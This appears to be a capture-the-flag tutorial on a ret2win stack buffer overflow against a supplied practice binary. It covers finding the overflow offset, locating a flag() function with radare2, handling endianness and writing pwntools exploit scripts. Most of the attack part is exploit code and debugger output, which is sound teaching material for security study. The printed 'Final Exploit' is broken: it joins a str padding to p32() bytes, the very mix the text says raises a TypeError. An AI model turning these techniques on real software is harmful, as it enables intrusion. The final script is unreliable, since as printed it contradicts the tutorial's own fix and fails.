---
description: 'One of the most basic binexp challenges of all, the ret2win'
---

# ret2win

A **ret2win** is simply a binary where there is a `win()` function \(or equivalent\); once you successfully redirect execution there, you complete the challenge.

To carry this out, we have to leverage what we learnt in the **introduction**, but in a _predictable manner_ - we have to overwrite EIP, but to a specific value of our choice.

To do this, what do we need to know? Well, a couple things:

* The padding _until_ we begin to overwrite the EIP
* What value we want to overwrite EIP to

{% file src="../.gitbook/assets/ret2win.zip" caption="ret2win" %}

### Finding the Padding

This can be found using simple trial and error; if we send variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force \(we'll cover this in the next post\), but it'll do for now.

> Note: You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.

We get an offset of 52 bytes.

### Finding the Address

Now we need to find the address of the `flag()` function in the binary. This is simple.

```text
$ r2 -d -A vuln
$ afl
[...]
0x080491c3    1 43           sym.flag
[...]
```

> Note: `afl` stands for **A**nalyse **F**unctions **L**ist

The `flag()` function is at `0x080491c3`.

### Using the Information

The final piece of the puzzle is to work out how we can send the address we want. If you think back to the introduction, the `A`s that we sent became `0x41` - which is the ASCII code of `A`. So the solution is simple - let's just find the characters with ascii codes `0x08`, `0x04`, `0x91` and `0xc3`.

This is a lot simpler than you might think, because we can specify them in python as hex:

```python
address = '\x08\x04\x91\xc3'
```

And that makes it much easier.

### Putting it Together

Now we know the padding and the value, let's exploit the binary! We can use pwntools to interface with the binary \(check out the pwntools posts for a more in-depth look\).

```python
from pwn import *        # This is how we import pwntools

p = process('./vuln')    # We're starting a new process

payload = 'A' * 52
payload += '\x08\x04\x91\xc3'

p.clean()                # Receive all the text

p.sendline(payload)

log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
```

If you run this, there is one small problem: it won't work. Why? Let's check with a debugger. We'll put in a `pause()` to give us time to attach `radare2` onto the process.

```python
from pwn import *        # This is how we import pwntools

p = process('./vuln')    # We're starting a new process

payload = 'A' * 52
payload += '\x08\x04\x91\xc3'

log.info(p.clean())      # Receive all the text

pause()

p.sendline(payload)

log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
```

Now let's run the script with `python3 exploit.py` and then open up a new terminal window.

```text
r2 -d -A $(pidof vuln)
```

By providing the PID of the process, radare2 hooks onto it. Let's break at the return of `unsafe()` and read the value of the return pointer.

```text
[0x08049172]> db 0x080491aa
[0x08049172]> dc
<<press any button on the exploit terminal window>>
hit breakpoint at: 80491aa
[0x080491aa]> pxw @ esp
0xffdb0f7c  0xc3910408 [...]
[...]
```

`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** \(the byte with the largest value\) at the smallest memory address, while little-endian does the opposite; most binaries you will come across are little-endian. Essentially, as far as we're concerned, the byte are stored in reverse order in little-endian executables.

### Finding the Endianness

`radare2` comes with a nice tool called `rabin2` for binary analysis:

```text
$ rabin2 -I vuln
[...]
endian   little
[...]
```

So our binary is **little-endian**.

### Accounting for Endianness

The fix is simple - reverse the address \(you can also remove the `pause()`\)

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

If you run this now, it will work:

```text
$ python3 tutorial.py 
[+] Starting local process './vuln': pid 2290
[*] Overflow me
[*] Exploited!!!!!
```

And wham, you've called the `flag()` function! Congrats!

### Pwntools and Endianness

Unsurprisingly, you're not the first person to have thought "could they possibly make endianness simpler" - luckily, pwntools has a built-in `p32()` function ready for use!

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

becomes

```python
payload += p32(0x080491c3)
```

Much simpler, right?

The only caveat is that it returns `bytes` rather than a string, so you have to make the padding a byte string:

```python
payload = b'A' * 52        # Notice the "b"
```

Otherwise you will get a

```text
TypeError: can only concatenate str (not "bytes") to str
```

### Final Exploit

```python
from pwn import *            # This is how we import pwntools

p = process('./vuln')        # We're starting a new process

payload = 'A' * 52
payload += p32(0x080491c3)   # Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
```

